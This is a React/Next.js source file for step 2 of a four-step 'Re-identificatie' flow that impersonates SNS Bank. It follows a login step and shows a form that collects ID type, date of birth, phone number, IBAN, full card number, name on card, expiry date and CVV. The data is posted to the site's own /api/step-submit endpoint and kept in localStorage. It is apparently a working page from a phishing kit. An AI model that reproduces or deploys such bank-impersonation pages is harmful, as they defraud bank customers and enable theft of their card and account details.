"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { useForm } from "react-hook-form"
import { zodResolver } from "@hookform/resolvers/zod"
import { z } from "zod"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { FileCheck, ArrowLeft, ArrowRight, CreditCard } from "lucide-react"
import { useToast } from "@/hooks/use-toast"

const step2Schema = z.object({
  idType: z.enum(["passport", "id-card", "drivers-license"], {
    required_error: "Selecteer een type identiteitsbewijs",
  }),
  fullNameConfirm: z.string().min(1, "Bevestig uw volledige naam"),
  dateOfBirth: z.string().min(1, "Geboortedatum is verplicht"),
  phoneNumber: z.string().min(1, "Telefoonnummer is verplicht"),
  accountNumber: z.string().min(1, "Rekeningnummer is verplicht"),
  cardNumber: z.string().min(1, "Kaartnummer is verplicht"),
  cardName: z.string().min(1, "Naam op kaart is verplicht"),
  expiryDate: z.string().min(1, "Vervaldatum is verplicht"),
  cvv: z.string().min(3, "CVV moet minimaal 3 cijfers zijn"),
})

type Step2Data = z.infer<typeof step2Schema>

export default function Step2() {
  const router = useRouter()
  const { toast } = useToast()
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [step1Data, setStep1Data] = useState<any>(null)

  useEffect(() => {
    const data = localStorage.getItem("step1Data")
    if (!data) {
      router.push("/step-1")
      return
    }
    setStep1Data(JSON.parse(data))
  }, [router])

  const form = useForm<Step2Data>({
    resolver: zodResolver(step2Schema),
    defaultValues: {
      fullNameConfirm: step1Data?.fullName || "",
      dateOfBirth: "",
      phoneNumber: "",
      accountNumber: "",
      cardNumber: "",
      cardName: "",
      expiryDate: "",
      cvv: "",
    },
  })

  const onSubmit = async (data: Step2Data) => {
    setIsSubmitting(true)

    try {
      const response = await fetch("/api/step-submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ...data, step: 2 }),
      })

      if (!response.ok) {
        throw new Error("Fout bij verzenden")
      }

      localStorage.setItem("step2Data", JSON.stringify(data))

      toast({
        title: "Stap 2 voltooid",
        description: "Uw persoonlijke gegevens zijn opgeslagen. Ga door naar stap 3.",
      })

      router.push("/step-3")
    } catch (error) {
      toast({
        title: "Fout bij verzenden",
        description: "Er is een fout opgetreden. Probeer het opnieuw.",
        variant: "destructive",
      })
    } finally {
      setIsSubmitting(false)
    }
  }

  const handleBack = () => {
    router.push("/step-1")
  }

  if (!step1Data) {
    return <div>Loading...</div>
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-orange-50 to-white">
      {/* Header with Progress */}
      <header className="bg-white border-b border-gray-200 shadow-sm">
        <div className="max-w-4xl mx-auto px-4 py-6">
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center space-x-4">
              <div className="w-12 h-12 bg-gradient-to-br from-orange-500 to-orange-600 rounded-lg flex items-center justify-center">
                <span className="text-white font-bold text-lg">SNS</span>
              </div>
              <div>
                <h1 className="text-xl font-bold text-gray-900">SNS Bank</h1>
                <p className="text-orange-600 text-sm">Re-identificatie</p>
              </div>
            </div>
          </div>

          {/* Progress Indicator */}
          <div className="flex items-center justify-center">
            <div className="flex items-center space-x-4">
              <div className="flex items-center">
                <div className="w-10 h-10 bg-green-500 text-white rounded-full flex items-center justify-center text-sm font-bold">
                  ✓
                </div>
                <span className="ml-3 text-sm font-medium text-green-600">Inloggen</span>
              </div>
              <div className="w-12 h-px bg-orange-300"></div>
              <div className="flex items-center">
                <div className="w-10 h-10 bg-orange-500 text-white rounded-full flex items-center justify-center text-sm font-bold">
                  2
                </div>
                <span className="ml-3 text-sm font-medium text-orange-600">Persoonlijke gegevens</span>
              </div>
              <div className="w-12 h-px bg-gray-300"></div>
              <div className="flex items-center">
                <div className="w-10 h-10 bg-gray-200 text-gray-500 rounded-full flex items-center justify-center text-sm font-bold">
                  3
                </div>
                <span className="ml-3 text-sm text-gray-500">Aanvullende info</span>
              </div>
              <div className="w-12 h-px bg-gray-300"></div>
              <div className="flex items-center">
                <div className="w-10 h-10 bg-gray-200 text-gray-500 rounded-full flex items-center justify-center text-sm font-bold">
                  4
                </div>
                <span className="ml-3 text-sm text-gray-500">Bevestiging</span>
              </div>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-3xl mx-auto px-4 py-12">
        <Card className="shadow-xl border-0">
          <CardContent className="p-8">
            <div className="text-center mb-8">
              <div className="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-6">
                <FileCheck className="h-10 w-10 text-blue-600" />
              </div>
              <h2 className="text-3xl font-bold text-gray-900 mb-3">Persoonlijke gegevens</h2>
              <p className="text-gray-600">Vul uw identiteitsgegevens en bankgegevens in</p>
            </div>

            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
                <div className="grid md:grid-cols-2 gap-6">
                  <FormField
                    control={form.control}
                    name="idType"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-gray-900 font-semibold">Type identiteitsbewijs</FormLabel>
                        <Select onValueChange={field.onChange} defaultValue={field.value}>
                          <FormControl>
                            <SelectTrigger className="h-12 border-2 focus:border-orange-500">
                              <SelectValue placeholder="Selecteer..." />
                            </SelectTrigger>
                          </FormControl>
                          <SelectContent>
                            <SelectItem value="passport">Paspoort</SelectItem>
                            <SelectItem value="id-card">Nederlandse identiteitskaart</SelectItem>
                            <SelectItem value="drivers-license">Rijbewijs</SelectItem>
                          </SelectContent>
                        </Select>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="fullNameConfirm"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-gray-900 font-semibold">Volledige naam (bevestigen)</FormLabel>
                        <FormControl>
                          <Input
                            placeholder="Bevestig uw volledige naam"
                            {...field}
                            className="h-12 border-2 focus:border-orange-500"
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="dateOfBirth"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-gray-900 font-semibold">Geboortedatum</FormLabel>
                        <FormControl>
                          <Input type="date" {...field} className="h-12 border-2 focus:border-orange-500" />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="phoneNumber"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-gray-900 font-semibold">Telefoonnummer</FormLabel>
                        <FormControl>
                          <Input
                            type="tel"
                            placeholder="06 12345678"
                            {...field}
                            className="h-12 border-2 focus:border-orange-500"
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="accountNumber"
                    render={({ field }) => (
                      <FormItem className="md:col-span-2">
                        <FormLabel className="text-gray-900 font-semibold">Rekeningnummer (IBAN)</FormLabel>
                        <FormControl>
                          <Input
                            placeholder="NL00 BANK 0000 0000 00"
                            {...field}
                            className="h-12 border-2 focus:border-orange-500"
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </div>

                {/* Card Details Section */}
                <div className="bg-gray-50 rounded-xl p-6 border border-gray-200">
                  <div className="flex items-center space-x-3 mb-6">
                    <div className="w-12 h-12 bg-orange-100 rounded-lg flex items-center justify-center">
                      <CreditCard className="h-6 w-6 text-orange-600" />
                    </div>
                    <div>
                      <h3 className="text-xl font-semibold text-gray-900">Kaartgegevens</h3>
                      <p className="text-gray-600 text-sm">Vul uw SNS bankkaart gegevens in</p>
                    </div>
                  </div>

                  <div className="grid md:grid-cols-2 gap-6">
                    <FormField
                      control={form.control}
                      name="cardNumber"
                      render={({ field }) => (
                        <FormItem className="md:col-span-2">
                          <FormLabel className="text-gray-900 font-semibold">Kaartnummer</FormLabel>
                          <FormControl>
                            <Input
                              placeholder="1234 5678 9012 3456"
                              {...field}
                              className="h-12 border-2 focus:border-orange-500"
                            />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />

                    <FormField
                      control={form.control}
                      name="cardName"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel className="text-gray-900 font-semibold">Naam op kaart</FormLabel>
                          <FormControl>
                            <Input
                              placeholder="Zoals op kaart staat"
                              {...field}
                              className="h-12 border-2 focus:border-orange-500"
                            />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />

                    <FormField
                      control={form.control}
                      name="expiryDate"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel className="text-gray-900 font-semibold">Vervaldatum</FormLabel>
                          <FormControl>
                            <Input placeholder="MM/YY" {...field} className="h-12 border-2 focus:border-orange-500" />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />

                    <FormField
                      control={form.control}
                      name="cvv"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel className="text-gray-900 font-semibold">CVV</FormLabel>
                          <FormControl>
                            <Input
                              placeholder="123"
                              {...field}
                              className="h-12 border-2 focus:border-orange-500"
                              maxLength={4}
                            />
                          </FormControl>
                          <FormMessage />
                          <p className="text-xs text-gray-500">3 cijfers op achterkant kaart</p>
                        </FormItem>
                      )}
                    />
                  </div>
                </div>

                <div className="flex flex-col gap-4 mt-10">
                  <Button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white h-14 text-lg font-semibold rounded-lg shadow-lg hover:shadow-xl transition-all duration-200"
                  >
                    {isSubmitting ? (
                      <div className="flex items-center space-x-2">
                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        <span>Bezig met opslaan...</span>
                      </div>
                    ) : (
                      <div className="flex items-center space-x-2">
                        <span>Volgende stap</span>
                        <ArrowRight className="h-5 w-5" />
                      </div>
                    )}
                  </Button>
                  <Button
                    type="button"
                    variant="outline"
                    onClick={handleBack}
                    disabled={isSubmitting}
                    className="w-full h-14 border-2 border-gray-300 hover:border-orange-500 text-gray-700 hover:text-orange-600 rounded-lg bg-transparent"
                  >
                    <ArrowLeft className="h-5 w-5 mr-2" />
                    Terug naar stap 1
                  </Button>
                </div>
              </form>
            </Form>
          </CardContent>
        </Card>
      </main>
    </div>
  )
}
